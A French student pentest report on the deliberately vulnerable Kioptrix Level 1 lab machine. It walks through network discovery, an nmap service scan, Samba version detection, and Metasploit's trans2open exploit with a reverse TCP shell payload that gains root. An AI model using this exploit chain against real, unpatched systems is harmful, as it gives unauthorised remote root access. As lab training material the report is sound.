# Compte Rendu : Pentest Kioptrix Level 1

**Auteur :** Badolle Titouan
**Date :** 24 Novembre 2025
**Cible :** Kioptrix Level 1

---

## 1. Installation de l'infrastructure
J'ai configuré un réseau privé isolé (Host-Only) pour effectuer le test d'intrusion.
* **Ma machine (Kali) :** `192.168.195.3`
* **Machine Cible (Kioptrix) :** `192.168.195.5`

## 2. Reconnaissance

### 2.1 Découverte de l'IP
J'ai utilisé `netdiscover` pour scanner le réseau local.
* **Commande :** `sudo netdiscover -r 192.168.195.0/24`
* **Résultat :** La cible a été identifiée à l'adresse **192.168.195.5**.

### 2.2 Scan des services
J'ai scanné les ports avec Nmap pour identifier les versions logicielles.
* **Commande :** `nmap -sV 192.168.195.5`
* **Résultats :**
    * Port 22 : OpenSSH 2.9p2
    * Port 80/443 : Apache 1.3.20
    * Port 139 : Samba (Version non détectée par Nmap)

### 2.3 Identification de Samba
Comme Nmap n'a pas donné la version de Samba, j'ai utilisé un scanner Metasploit.
* **Module :** `auxiliary/scanner/smb/smb_version`
* **Version trouvée :** **Samba 2.2.1a**

## 3. Exploitation (Pirater la machine)

J'ai trouvé une faille critique ("trans2open") pour cette version de Samba. J'ai utilisé Metasploit pour l'exploiter.

### 3.1 Configuration
* **Exploit :** `use exploit/linux/samba/trans2open`
* **Cible (RHOSTS) :** `set RHOSTS 192.168.195.5`

### 3.2 Adaptation du Payload
Le payload par défaut (Meterpreter) ne fonctionne pas sur cette vieille machine. J'ai dû configurer un "Reverse Shell" classique et indiquer mon adresse IP pour le retour.
* **Payload :** `set payload linux/x86/shell_reverse_tcp`
* **Mon IP (LHOST) :** `set LHOST 192.168.195.3`

### 3.3 Exécution
J'ai lancé la commande `exploit`. Après quelques tentatives de "Brute Force" (et un redémarrage de la cible suite à un plantage du service), j'ai obtenu un accès.

## 4. Preuve de réussite
Une session s'est ouverte. J'ai vérifié mes droits :


* **Commande :** `whoami`
* **Résultat :** `root` (Administrateur)

J'ai ensuite récupéré le message de félicitations dans les mails du root :
* **Commande :** `cat /var/spool/mail/root`
